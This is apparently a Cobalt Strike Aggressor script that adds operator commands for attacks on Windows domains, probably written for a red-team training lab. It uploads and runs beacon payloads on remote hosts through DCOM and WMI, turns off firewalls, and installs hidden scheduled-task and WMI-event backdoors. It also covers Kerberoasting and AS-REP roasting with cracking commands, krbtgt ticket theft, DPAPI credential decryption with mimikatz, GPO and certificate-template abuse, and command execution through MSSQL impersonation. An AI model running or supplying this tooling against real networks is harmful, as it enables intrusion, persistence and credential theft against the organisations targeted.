# $1 is beacon id
# $2 target
# $3 selected listener

#GLOBAL VARIABLES
$SHARPWMI_BIN_PATH  = getFileProper("C:\\Tools\\SharpWMI\\SharpWMI\\bin\\Release","SharpWMI.exe");
$INVOKE_DCOM_PATH   = getFileProper("C:\\Tools","Invoke-DCOM.ps1");
$POWERVIEW_PATH     = getFileProper("C:\\Tools\\PowerSploit\\Recon", "PowerView.ps1");
$RUBEUS_PATH        = getFileProper("C:\\Tools\\Rubeus\\Rubeus\\bin\\Release","Rubeus.exe");
$SEATBELT_PATH      = getFileProper("C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Release","Seatbelt.exe");
$ADSEARCH_PATH      = getFileProper("C:\\Tools\\ADSearch\\ADSearch\\bin\\Release","ADSearch.exe");
$SHAREPERSIST_PATH  = getFileProper("C:\\Tools\\SharPersist\\SharPersist\\bin\\Release","SharPersist.exe");
$SHARPUP_PATH       = getFileProper("C:\\Tools\\SharpUp\\SharpUp\\bin\\Release","SharpUp.exe");
$GETSERVICEACL_PATH = getFileProper("c:\\Tools","Get-ServiceAcl.ps1");
$POWERLURK_PATH     = getFileProper("C:\\Tools","PowerLurk.ps1");
$CERTIFY_PATH       = getFileProper("C:\\Tools\\Certify\\Certify\\bin\\Release","Certify.exe");
$SHARPGPOABUSE_PATH = getFileProper("C:\\Tools\\SharpGPOAbuse\\SharpGPOAbuse\\bin\\Release","SharpGPOAbuse.exe");
$POWERUP_PATH       = getFileProper("C:\\Tools\\PowerSploit\\Privesc","PowerUp.ps1");
$POWERUPSQL_PATH    = getFileProper("C:\\Tools\\PowerUpSQL","PowerUpSQL.ps1");
$SQLRECON_PATH      = getFileProper("C:\\Tools\\SQLRecon\\SQLRecon\\SQLRecon\\bin\\Release","SQLRecon.exe");

#TEST FUNCTION
command beacons {
   local('$entry $key $value');
   foreach $entry (beacons()) {
      println("== " . $entry['id'] . " ==");
      foreach $key => $value ($entry) {
         println("$[20]key : $value");
      }
      println();
   }
}

#generate random printable text of $length
sub rand_alphanum {
    local('$length $out $charstr $i $index');
    $length = $1;
    $charstr = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890';
    $out = '';
    for($i = 0; $i < $length; $i++)
    {
        $index = rand(strlen($charstr));
        $out = $out . substr($charstr, $index, $index + 1);
    }
    return $out;
}

#ADD INVOKE_DCOM TO JUMP COMMAND
sub invoke_dcom
{
    local('$handle $script $oneliner $filename $payload');

    #beacon acknowledgement
    btask($1, "Task Beacon to run " . listener_describe($3) . " on $2 via INVOKE_DCOM");

    #import the script
    $handle = openf($INVOKE_DCOM_PATH);
    $script = readb($handle, -1);
    closef($handle);

    #send script to beacon
    $oneliner = beacon_host_script($1, $script);

    #generate payload (stageless)
    $payload = artifact_payload($3, "exe", "x64");
    $filename = rand_alphanum(4) . ".exe";

    #upload payload to target
    bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\ $+ $filename $+ ", $payload);

    println("Invoke-DCOM Oneliner: " . $oneliner);
    println("Filename: ". $filename);
    #execute script from powerpick
    bpowerpick($1, "Invoke-DCOM -ComputerName  $+ $2 $+  -Method MMC20.Application -Command C:\\Windows\\ $+ $filename $+ ", $oneliner);

    #link if p2p beacon
    beacon_link($1, $2, $3);
}
beacon_remote_exploit_register("invoke-dcom", "x64", "Uses invoke_dcom.ps1 to run remote beacon", &invoke_dcom)

#ADD INVOKE-DCOM TO REMOTE-EXEC COMMAND
sub invoke_dcom_remoteexec
{
    local('$handle $script $oneliner');

    #beacon acknowledgement
    btask($1, "Task Beacon to run remote-exec on $2 via INVOKE_DCOM");

    #import the script
    $handle = openf($INVOKE_DCOM_PATH);
    $script = readb($handle, -1);
    closef($handle);

    #send script to beacon
    $oneliner = beacon_host_script($1, $script);

    bpowerpick($1, "Invoke-DCOM -ComputerName  $+ $2 $+  -Method MMC20.Application -Command  $+ $3 $+ ", $oneliner);
}
beacon_remote_exec_method_register("invoke-dcom", "Remote execute via powershell Invoke-DCOM", &invoke_dcom_remoteexec);

#ADD SHARPWMI TO JUMP COMMAND
sub sharpwmi
{
    local('$binpath $uploadpath $filename $args $payload')

    #beacon acknowledgement
    btask($1, "Task Beacon to run " . listener_describe($3) . " on $2 via SharpWMI");
    println("Running jump sharpwmi.")

    #define binary path
    $binpath = $SHARPWMI_BIN_PATH;

    #generate payload (stageless)
    $payload = artifact_payload($3, "exe", "x64");
    $filename = rand_alphanum(4) . ".exe";

    #upload payload to target
    $uploadpath = "\\\\ $+ $2 $+ \\C$\\Windows\\ $+ $filename $+ ";
    println("Uploading binary to:" . $uploadpath);
    bupload_raw($1, $uploadpath, $payload);

    #execute script from powerpick
    $args = "action=exec computername= $+ $2 $+  command= $+ $uploadpath $+ ";
    println("Execution args: " . $args);
    bexecute_assembly($1, $binpath, $args);

    #link if p2p beacon
    beacon_link($1, $2, $3);
}
beacon_remote_exploit_register("sharpwmi", "x64", "Uses SharpWMI to run remote beacon", &sharpwmi)

alias import_powerview {
    bpowershell_import($1, $POWERVIEW_PATH);
}
beacon_command_register(
    "import_powerview",
    "Imports Powerview into current beacon"
);

alias import_powerup {
    bpowershell_import($1, $POWERUP_PATH);
}
beacon_command_register(
    "import_powerup",
    "Imports PowerUp into current beacon"
);

alias import_powerupsql {
    bpowershell_import($1, $POWERUPSQL_PATH);
}
beacon_command_register(
    "import_powerupsql",
    "Imports PowerUpSQL into current beacon"
);

#FIREWALL ALIASES
alias shieldsdown {
    #This function creates a service on the remote host, starts it, and cleans it up.
    bpsexec_command($1, $2, "shieldsdn", "cmd.exe /c netsh advfirewall set allprofiles state off");
}
beacon_command_register(
    "shieldsdown",
    "Disables host firewall"
);

alias openport {
    #powerpick new-netfirewallrule -displayname "8445-INBOUND" -Direction inbound -protocol tcp -action allow -localport 8445
    bpowerpick($1, "powerpick new-netfirewallrule -displayname \" $+ $2 $- -INBOUND\" -Direction inbound -protocol tcp -action allow -localport  $+ $2 $- ")
}
beacon_command_register(
    "openport",
    "Opens the port specified",
    "Opens the port specified"
);

#EXECUTE ASSEMBLY ALIAS
alias rubeus {
    bexecute_assembly($1, $RUBEUS_PATH, $2)
}
beacon_command_register(
    "rubeus",
    "Execute Assmembly of Rubeus",
    "Execute Assmembly of Rubeus\n\nArgs must be wrapped in double quotes"
);
alias certify {
    bexecute_assembly($1, $CERTIFY_PATH, $2);
}
beacon_command_register(
    "certify",
    "Execute Assmembly of Certify",
    "Execute Assmembly of Certify\n\nArgs must be wrapped in double quotes"
);

alias seatbelt {
    bexecute_assembly($1, $SEATBELT_PATH, $2)
}
beacon_command_register(
    "seatbelt",
    "Execute Assmembly of Seatbelt",
    "Execute Assmembly of Seatbelt\n\nArgs must be wrapped in double quotes"
);

alias adsearch {
    bexecute_assembly($1, $ADSEARCH_PATH, $2)
}
beacon_command_register(
    "adsearch",
    "Execute Assmembly of ADSearch",
    "Execute Assmembly of ADSearch\n\nArgs must be wrapped in double quotes"
);

#KERBEROASTING
#FIND TARGETS
alias kerberoast_findtargets {
    bpowerpick($1, 'Get-NetUser -SPN | select serviceprincipalname,userprincipalname');
}
beacon_command_register(
    "kerberoast_findtargets",
    "User PowerView to find SPNs"
);

#GRABBING KRB5TGS HASH
sub kerberoast_tgsreq_cb{
    blog($1, $2);
    blog($1, "Cracking with Hashcat:'hashcat -a 0 -m 13100 hashes.txt wordlist.txt'");
    blog($1, "Cracking with John:'john --format=krb5tgs --wordlist=wordlist <user>'");
}
alias kerberoast_tgsreq{
    bexecute_assembly($1, $RUBEUS_PATH, 'kerberoast /nowrap /user:' . $2, $null, &kerberoast_tgsreq_cb);
}
beacon_command_register(
    "kerberoast_tgsreq",
    "Request the TGS with Rubeus"
);

#AS-REP ROASTING
#FIND TARGETS
alias asreproast_findtargets {
   bexecute_assembly($1, $ADSEARCH_PATH, '--search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname');
}
beacon_command_register(
    "asreproast_findtargets",
    "Find AS-REP roastable targets"
);

#REQUEST HASH
sub asreproast_requesthash_cb {
    blog($1, $2);
    blog($1, "Cracking with Hashcat:'hashcat -a 0 -m 18200 hashes.txt wordlist.txt'");
    blog($1, "Cracking with John:'john --format=krb5asrep --wordlist=wordlist <user>'");
}
alias asreproast_requesthash {
    bexecute_assembly($1, $RUBEUS_PATH, 'asreproast /nowrap /user:' . $2, $null, &asreproast_requesthash_cb);
}
beacon_command_register(
    "asreproast_findtargets",
    "Get the specified user KRB5ASREP hash"
);

#UNCONSTRAINED DELEGATION
#FINDING TARGETS
alias unconstdel_findtargets {
    bexecute_assembly($1, $ADSEARCH_PATH, '--search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname')
}

#CONSTRAINED DELEGATION
#FINDING TARGETS
alias constdel_findtargets {
    bexecute_assembly($1, $ADSEARCH_PATH, "--search \"(&(objectCategory=computer)(msds-allowedtodelegateto=\*))\" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json")
}
beacon_command_register(
    "constdel01_findtargets",
    "Find Constrained Delegation Targets"
);

#TRIAGE THEN DUMP TGT
sub constdel_stealtgt_cb {
    #Arguments: $1 = beacon ID, $2 = results, $3 = information map
    local('$hostname $regx_luid $luid');

    $hostname = lc(binfo($1, "computer"));
    #println("hostname: " . $hostname);

    $regx_luid = '(0x\w+).*' . $hostname . '\$';
    
    $luid = matches($2, $regx_luid)[0];

    blog($1, $2);
    blog($1, "Targetting LUID:" . $luid);

    #dump ticket for krbtgt with $luid
    bexecute_assembly($1, $RUBEUS_PATH, "dump /nowrap /service:krbtgt /luid:" . $luid);
}
alias constdel02_stealtgt {
    #execute assembly and pass results to helper sub, run LUID
    bexecute_assembly($1, $RUBEUS_PATH, "triage /service:krbtgt", $null, &constdel02_stealtgt_cb);
}
beacon_command_register(
    "constdel02_stealtgt",
    "Steal the local machine TGT"
);

#ROLE BASED CONSTRAINED DELEGATION
#FINDING TARGETS
alias rbcd_findtargets {
    bpowerpick($1, 'Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }');
}
beacon_command_register(
    "rbcd_findtargets",
    "Find Role Based Constrained Delegation Machines");


#PERSISTANCE METHODS
## SCHEDULED TASKS
#execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <base64>" -n "Updater" -m add -o hourly
alias persist_schtask {
    $rand = rand_alphanum(4);
    
    #not encoding properly!
    $b64payload = base64_encode($2);
    
    blog($1, "Encoding " . $2);
    blog($1, "Base64: " . $b64payload);

    $parameters = '-t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"';
    $parameters = $parameters . ' -a "-nop -w hidden -enc ' . $b64payload. '"';
    $parameters = $parameters . ' -n "Updater-' . $rand . '" -m add -o hourly';
    blog($1, "Executing SharPersist " . $parameters);

    bexecute_assembly($1, $SHAREPERSIST_PATH, $parameters);
}
beacon_command_register(
    "persist_schtask",
    "Install a backdoored scheduled task",
    "Usage: persist_schtask [powershell commands]"
);

##WMI EVENTS
alias persist_wmievent{
    #$1 beaconid
    #$2 name
    #$3 processname
    #$4 listener

    #check if beacon is elevated
    if(-isadmin $1){
        #beacon acknowledgement
        btask($1, "Task Beacon to register WMI Event");

        #import the script
        $handle = openf($POWERLURK_PATH);
        $script = readb($handle, -1);
        closef($handle);

        #send script to beacon
        $oneliner = beacon_host_script($1, $script);

        #generate payload (stageless)
        $payload = artifact_payload($4, "exe", "x64");
        $filename = rand_alphanum(4) . ".exe";

        #upload payload to target
        $upload_path = "C:\\Windows\\Temp\\ $+ $filename $+ ";
        bupload_raw($1, $upload_path , $payload);

        bpowerpick($1, "Register-MaliciousWmiEvent -EventName $2 -PermanentCommand \" $+ $upload_path $+ \" -Trigger ProcessStart -ProcessName $3", $oneliner);
    } else {
        berror($1, "Can only be run from elevated access.");
    }
}
beacon_command_register(
    "persist_wmievent",
    "Use PowerLurk to reate triggers for wmi events",
    "Usage: persist_wmievent [Name] [ProcessName] [listener]"
)

#PRIVILEGE ESCALATION HELPERS
##UNQUOTED SERVICE PATHS
alias privesc_unquotedpath {
    bexecute_assembly($1, $SHARPUP_PATH, "audit UnquotedServicePath");
}
beacon_command_register(
    "privesc_unquotedpath",
    "Checkes Unquoted Paths",
    "Uses SharpUp to check for unquoted service paths"
);

##WEAK SERVICE PERMS
sub privesc_weaksvcperms_cb {
    #Arguments: $1 = beacon ID, $2 = results, $3 = information map
    local('$regx_service $service $script $oneliner');
    
    $regx_service = '\sService \'(\w+)\'';
    
    $services = matches($2, $regx_service);
    
    blog($1, $2);

    foreach $service ($services) {
        blog($1, "Vulnerable Services: ". $service);

        #import the script
        $handle = openf($GETSERVICEACL_PATH);
        $script = readb($handle, -1);
        closef($handle);

        #send script to beacon
        $oneliner = beacon_host_script($1, $script);

        bpowerpick($1, "get-serviceacl -name " . $service . " | select -expand Access", $oneliner);

    }
}
alias privesc_weaksvcperms {
    bexecute_assembly($1, $SHARPUP_PATH, "audit ModifiableServices", $null, &privesc_weaksvcperms_cb);
}
beacon_command_register(
    "privesc_weaksvcperms",
    "Checkes for weak service permissions",
    "Uses SharpUp to check for weak service permissions"
);

##WEAK SERVICE BINARY PERMS
sub privesc_weaksvcbinaryperms_cb {
    blog($1, $2);
    blog($1, "Use 'powerpick get-acl -Path <binpath> | fl' to check permissions");
    
}

alias privesc_weaksvcbinaryperms {
    bexecute_assembly($1, $SHARPUP_PATH, "audit ModifiableServiceBinaries", $null, &privesc_weaksvcbinaryperms_cb);
}
beacon_command_register(
    "privesc_weaksvcbinaryperms",
    "Checkes for weak service binary permissions",
    "Uses SharpUp to check for weak service binary permissions"
);

#DPAPI HACKAGE
##STORED USER CREDS
###FIND VAULTS
sub dpapi_findvaults_cb{
    blog($1, $2);
    blog($1, "Check for potential creds to target.");
}
alias dpapi_findvaults {
    bexecute_assembly($1, $SEATBELT_PATH, "WindowsVault", $null, &dpapi_findvaults_cb);
}
beacon_command_register("dpapi_findvaults", "Locate DPAPI Vaults w/ Seatbelt");

###FIND CREDENTIAL FILS
sub dpapi_findcredfiles_cb{
    blog($1, $2);
    blog($1, "Note the master key guid\nUse 'powerpick get-domainuser bfarmer | select -expand objectsid' to get userSID");
}
alias dpapi_findcredfiles {
    bexecute_assembly($1, $SEATBELT_PATH, "WindowsCredentialFiles", $null, &dpapi_findcredfiles_cb);
}
beacon_command_register("dpapi_findcredfiles", "Locate DPAPI Vaults w/ Seatbelt");

###REQUEST MASTERKEY FROM DC VIA RPC
alias dpapi_reqBackupMasterKey {
    #   C:\Users
    #$2 \bfarmer (username)
    #   \AppData\Roaming\Microsoft\Protect
    #$3 \S-1-5-21-569305411-121244042-2357301523-1104 (User SID)
    #$4 \bfc5090d-22fe-4058-8953-47f6882f549e (Master Key)
    
    $credpath = "C:\\Users\\ $+ $2 $+ \\AppData\\Roaming\\Microsoft\\Protect\\ $+ $3 $+ \\ $+ $4 $+ ";
    println("CredPath: " . $credpath);
    bmimikatz($1, "@dpapi::masterkey /in: $+ $credpath $+  /rpc");
}
beacon_command_register(
    "dpapi_reqBackupMasterKey",
    "Use mimikatz to request backup Masterkey from DC",
    "Usage: dpapi_reqBackupMasterKey [userid] [userSID] [MasterKeyGUID]"
);

###DECRYPT CREDENTIAL FILE
alias dpapi_decryptCredFile {
    #$2 (username)
    #$3 (Credential File UID)
    #$4 (master key)

    $credpath = "C:\\Users\\ $+ $2 $+ \\AppData\\Local\\Microsoft\\Credentials\\ $+ $3 $+ ";
    bmimikatz($1, "dpapi::cred /in: $+ $credpath $+  /masterkey: $+ $4 $+ ");
}
beacon_command_register(
    "dpapi_decryptCredFile",
    "Decrypte Credential with DPAPI Master Key",
    "Usage: dpapi_decryptCredFile [username] [Cred File UID] [MasterKey]"
);

##STORED SCHEDULED TASK CREDS
###FIND CREDENTIAL FILES
$files = @();
$currentfile = "";
$masterkey = '';
sub dpapi_schtask_listCredFiles_mimicred_cb {
    #$1 = beacon ID, $2 = results, $3 = information map
    #guidMasterKey      : {aaa23e6b-bba8-441d-923c-ec242d6690c3}
    local('$regex');
    $regex = 'guidMasterKey.*\{(.*)\}';
    $masterkey = matches($2, $regex)[0];
    blog($1, "KeyGUID: " . $masterkey . " " . "File: " . $currentfile);
}
sub dpapi_schtask_listCredFiles_lscb {
    #$1 = beacon ID, $2 = the folder, $3 = results
    local('$regex');
    $regex = '(\p{XDigit}{32})';
    $files = matches($3, $regex);
    # blog($1, "Found Credential Files: " . $files);
    foreach $file ($files){
        $currentfile = $file;
        bmimikatz($1, "dpapi::cred /in: $+ $path $+ \\ $+ $file $+ ",$null,$null,&dpapi_schtask_listCredFiles_mimicred_cb);
    }
    blog($1, "Run the command 'mimikatz !sekurlsa::dpapi' to find the master key for the corresponding GUID")
}
alias dpapi_schtask_listCredFiles {
    $path = "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials";
    bls($1, $path, &dpapi_schtask_listCredFiles_lscb);
}
beacon_command_register(
    "dpapi_schtask_listCredFiles",
    "List Scheduled Task Credential Files"
)

###GET CRED FILE MASTER KEY AND DECRYPT
alias dpapi_schtask_decryptCredFiles {
    #$1 =  beacon, $2 FileID, $3 MasterKey
    $mimikatzCommand = 'dpapi::cred ' .
    "/in:C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\ $+ $2 $+  " .
    "/masterkey: $+ $3 $+ ";

    bmimikatz($1, $mimikatzCommand);
}
beacon_command_register (
    "dpapi_schtask_decryptCredFiles",
    "Decrypt given Scheduled Tasks Credential File",
    "Usage: dpapi_schtask_decryptCredFiles [FileID] [MasterKey]"
);

#ADCS
##FIND CERT AUTHORITY
alias adcs_findcas {
    bexecute_assembly($1, $CERTIFY_PATH, "cas");
}
beacon_command_register(
    "adcs_findcas",
    "Find the Certificate Authority Server"
);

##FIND VULNERABLE TEMPLATES
alias adcs_checktempaltes{
    bexecute_assembly($1, $CERTIFY_PATH, "find /vulnerable");
}
beacon_command_register(
    "adcs_checktempaltes",
    "Look for vulnerable ADCS templates"
);

#GPO ABUSE METHODS
##FIND MODIFIABLE GPOs
alias gpo_findvulngpos {
    #bpowershell_import($1, $POWERVIEW_PATH);
    $command = 'Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }';
    bpowerpick($1, $command);
}
beacon_command_register(
    "gpo_findvulngpos",
    "Use PowerPick to find modifiable GPOs"
);
alias gpo_locategpo {
    #bpowershell_import($1, $POWERVIEW_PATH);
    $command = "Get-DomainGPO -Identity \" $+ $2 $+ \" | select displayname,gpcfilesyspath";
    bpowerpick($1, $command);
}
beacon_command_register(
    "gpo_locategpos",
    "Use PowerPick to find modifiable GPOs",
    "Usage: gpo_locategpos [GPO DN]"
);
alias gpo_convertfromsid {
    $command = "ConvertFrom-SID  $+ $2 $+ ";
    bpowerpick($1, $command);
}
beacon_command_register(
    "gpo_convertfromsid",
    "Use PowerPick to find modifiable GPOs",
    "Usage: gpo_convertfromsid [SID]"
);
alias gpo_sharpgpoabuse {
    bexecute_assembly($1, $SHARPGPOABUSE_PATH, $2);
}
beacon_command_register(
    "gpo_sharpgpoabuse",
    "Calls SharGPOAbuse.exe",
    "Usage: gpo_sharpgpoabuse \"<command>\""
)

#MSSQL HELPERS
## FIND SQL INSTANCES FROM DOMAIN
alias mssql_findinstances {
    bpowerpick($1, "Get-SQLInstanceDomain");
}
beacon_command_register(
    "mssql_findinstances",
    "Use PowerUpSQL to find MSSQL server instances"
);

alias mssql_connectiontest {
    bpowerpick($1, "Get-SQLConnectionTest -Instance \" $+ $2 $+ \"");
}
beacon_command_register(
    "mssql_connectiontest",
    "Use PowerUpSQL to test connction to a MSSQL server instances",
    "Usage: mssql_connectiontest [instance]"
);

alias mssql_getinstanceinfo {
    bpowerpick($1, "Get-SQLServerInfo -Instance \" $+ $2 $+ \"");
}
beacon_command_register(
    "mssql_getinstanceinfo",
    "Use PowerUpSQL to test connction to a MSSQL server instances",
    "Usage: mssql_getinstanceinfo [instance]"
);

alias mssql_guessdomaingroups {
    $query = 'Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }';
    bpowerpick($1, $query);
}
beacon_command_register(
    "mssql_guessdomaingroups",
    "Use PowerView to find AD Groups like *SQL*",
    "Usage: mssql_guessdomaingroups [instance]"
);

## TEST AUTHENTICATION
alias mssql_accesstestme {
    bexecute_assembly($1, $SQLRECON_PATH, "/a:wintoken /m:whoami /h:" . $2);
}
beacon_command_register(
    "mssql_accesstestme",
    "Use SQLRecon to test access to a MSSQL server instances",
    "Usage: mssql_accesstestme [instance]"
);

## TEST AUTHENTICATION
alias mssql_accesstestuser {
    println("mssql_accesstestuser: " . @_);
    $instance   = @_[1];
    $domain     = @_[2];
    $user       = @_[3];
    $password   = @_[4];

    $args = "/a:windomain /m:whoami "
    . " /h:" . $instance
    . " /d:" . $domain
    . " /u:" . $user
    . " /p:" . $password;

    bexecute_assembly($1, $SQLRECON_PATH, $args );
}
beacon_command_register(
    "mssql_accesstestuser",
    "Use SQLRecon to test access to a MSSQL server instances",
    "Usage: mssql_accesstestuser [instance] [domain] [user] [password]"
);

## EXECUTE QUERIES
alias mssql_query {
    $size       = size(@_);

    $args = "";
    if ($size == 3)
    {
        $instance   = @_[1];
        $query      = @_[2];

        $args = "/a:wintoken /m:query "
        . " /h:" . $instance
        . " /c:\"" . $query . "\"";
        println("mssql_checkimpersonation - args = " . $args);

    }
    else if ($size == 6)
    {
        $instance   = @_[1];
        $domain     = @_[2];
        $user       = @_[3];
        $password   = @_[4];
        $query      = @_[5];

        $args = "/a:windomain /m:query"
        . " /h:" . $instance
        . " /d:" . $domain
        . " /u:" . $user
        . " /p:" . $password
        . " /c:\"" . $query . "\"";
        println("mssql_checkimpersonation - args = " . $args);

    }
    else
    {
        berror($1, "Invalid parameters specified.");
        return;
    }
    
    bexecute_assembly($1, $SQLRECON_PATH, $args );
}
beacon_command_register(
    "mssql_query",
    "Use SQLRecon to run query against an instance",
    "Usage:\n"
    . "mssql_query [instance] [query]\n"
    . "mssql_query [instance] [domain] [user] [password] [query]"
);

alias mssql_iquery {
    $size = size(@_);

    $args = "";
    if ($size == 4)
    {
        #[instance] [Impersonated User] [query]
        $instance   = @_[1];
        $impaccount = @_[2];
        $query      = @_[3];

        $args = "/a:wintoken /m:iquery "
        . " /h:" . $instance
        . " /i:" . $impaccount
        . " /c:\"" . $query . "\"";
        println("mssql_iquery - args = " . $args);

    }
    else if ($size == 7)
    {
        $instance   = @_[1];
        $domain     = @_[2];
        $user       = @_[3];
        $password   = @_[4];
        $impaccount = @_[5];
        $query      = @_[6];

        $args = "/a:windomain /m:iquery"
        . " /h:" . $instance
        . " /d:" . $domain
        . " /u:" . $user
        . " /p:" . $password
        . " /i:" . $impaccount
        . " /c:\"" . $query . "\"";
        println("mssql_iquery - args = " . $args);

    }
    else
    {
        berror($1, "Invalid parameters specified.");
        return;
    }
    
    bexecute_assembly($1, $SQLRECON_PATH, $args );
}
beacon_command_register(
    "mssql_iquery",
    "Use SQLRecon to run query against an instance",
    "Usage:\n"
    . "mssql_iquery [instance] [Impersonated User] [query]\n"
    . "mssql_iquery [instance] [domain] [user] [password] [Impersonated User] [query]"
);

alias mssql_checkimpersonation {
    $size = size(@_);

    $query_imperonsate = "SELECT \* FROM sys.server_permissions WHERE permission_name = \'IMPERSONATE\'";

    $args = "";
    if ($size == 2)
    {
        $instance   = @_[1];

        $args = "/a:wintoken /m:query "
        . " /h:" . $instance;
        # . " /c:\"" . $query_imperonsate . "\"";
        println("mssql_checkimpersonation - args = " . $args);
    }
    else if ($size == 5)
    {
        $instance   = @_[1];
        $domain     = @_[2];
        $user       = @_[3];
        $password   = @_[4];

        $args = "/a:windomain /m:query"
        . " /h:" . $instance
        . " /d:" . $domain
        . " /u:" . $user
        . " /p:" . $password;
        # . " /c:\"" . $query_imperonsate . "\"";
        println("mssql_checkimpersonation - args = " . $args);
    }
    else
    {
        berror($1, "Invalid parameters specified.");
        return;
    }
    
    # bexecute_assembly($1, $SQLRECON_PATH, $args, $null, &mssql_checkimpersonation_cb);
    bexecute_assembly($1, $SQLRECON_PATH, $args . " /c:\"" . $query_imperonsate . "\"", $null, lambda({ mssql_checkimpersonation_cb ($1, $2, $args); }));
}
sub mssql_checkimpersonation_cb {
    blog($1, $2);
    $regex = '\p{Digit}+ \| \w+ \| \p{Digit}+ \| \p{Digit}+ \| (\p{Digit}+) \| (\p{Digit}+)';
    ($grantee, $grantor) = matches($2, $regex);
    
    $query = "SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals WHERE principal_id =  $+ $grantor $+  OR principal_id =  $+ $grantee $+ ;";
    bexecute_assembly($1, $SQLRECON_PATH, $args . " /c:\"" . $query . "\"");
}
beacon_command_register(
    "mssql_checkimpersonation",
    "Use SQLRecon to run query to check impersonation",
    "Usage:\n"
    . "mssql_checkimpersonation [instance]\n"
    . "mssql_checkimpersonation [instance] [domain] [user] [password]"
);

alias mssql_impersonatecommand {
    $size       = size(@_);

    $args = "";
    if ($size == 4)
    {
        # [instance] [impersonating account] [module]
        $instance   = @_[1];
        $impaccount = @_[2];
        $module     = @_[3];

        $args = "/a:wintoken"
        . " /m:" . $module
        . " /h:" . $instance
        . " /i:\"" . $impaccount . "\"";
        println("mssql_impersonatecommand - args = " . $args);

    }
    else if ($size == 6)
    {
        # [instance] [Auth domain] [Auth user] [Auth password] [impersonating account] [module]
        $instance   = @_[1];
        $domain     = @_[2];
        $user       = @_[3];
        $password   = @_[4];
        $impaccount = @_[5];
        $module     = @_[6];

        $args = "/a:windomain"
        . " /m:" . $module
        . " /h:" . $instance
        . " /d:" . $domain
        . " /u:" . $user
        . " /p:" . $password
        . " /i:\"" . $impaccount . "\"";
        println("mssql_impersonatecommand - args = " . $args);

    }
    else
    {
        berror($1, "Invalid parameters specified.");
        return;
    }
    
    bexecute_assembly($1, $SQLRECON_PATH, $args);
}
beacon_command_register(
    "mssql_impersonatecommand",
    "Use SQLRecon to run impersionated module against an instance",
    "Usage:\n"
    . "mssql_impersonatecommand [instance] [impersonating account] [module]\n"
    . "mssql_impersonatecommand [instance] [Auth domain] [Auth user] [Auth password] [impersonating account] [module]"
);

sub mssql_irunoscmd_cb2 {
    #($1, $2, $3, $args)
    blog($1, $2);
    $args = $4;
    println("$4 = " . $4);
    bexecute_assembly($1, $SQLRECON_PATH, $args . " /m:idisablexp");
}
sub mssql_irunoscmd_cb1 {
    #($1, $2, $3, $args, $command)
    blog($1, $2);
    $args = $4;
    $command = $5;
    $cb1_args = $args . " /m:ixpcmd /c:" . $command;

    bexecute_assembly($1, $SQLRECON_PATH, $cb1_args, $null, lambda({ mssql_irunoscmd_cb2 ($1, $2, $3, $args); }));
}
alias mssql_irunoscmd {
    $size = size(@_);

    $args = "";
    if ($size == 4)
    {
        # [instance] [impersonating account] [command]
        $instance   = @_[1];
        $impaccount = @_[2];
        $command    = @_[3];

        $args = "/a:wintoken"
        . " /h:" . $instance
        . " /i:" . $impaccount;
        println("mssql_impersonatecommand - args = " . $args);

    }
    else if ($size == 6)
    {
        # [instance] [Auth domain] [Auth user] [Auth password] [impersonating account] [command]
        $instance   = @_[1];
        $domain     = @_[2];
        $user       = @_[3];
        $password   = @_[4];
        $impaccount = @_[5];
        $command    = @_[6];

        $args = "/a:windomain"
        . " /h:" . $instance
        . " /d:" . $domain
        . " /u:" . $user
        . " /p:" . $password
        . " /i:" . $impaccount;
        println("mssql_irunoscmd - args = " . $args);

    }
    else
    {
        berror($1, "Invalid parameters specified.");
        return;
    }
    
    bexecute_assembly($1, $SQLRECON_PATH, $args . " /m:ienablexp", $null, lambda({ mssql_irunoscmd_cb1 ($1, $2, $3, $args, $command); }));
}
beacon_command_register(
    "mssql_irunoscmd",
    "Use SQLRecon to run impersionated OS command against an instance",
    "Use SQLRecon to run impersionated OS command against an instance
This command will enable XPCMD, run the command, then disable it.

Usage:\n"
    . "mssql_irunoscmd [instance] [impersonating account] [module]\n"
    . "mssql_irunoscmd [instance] [Auth domain] [Auth user] [Auth password] [impersonating account] [module]"
);
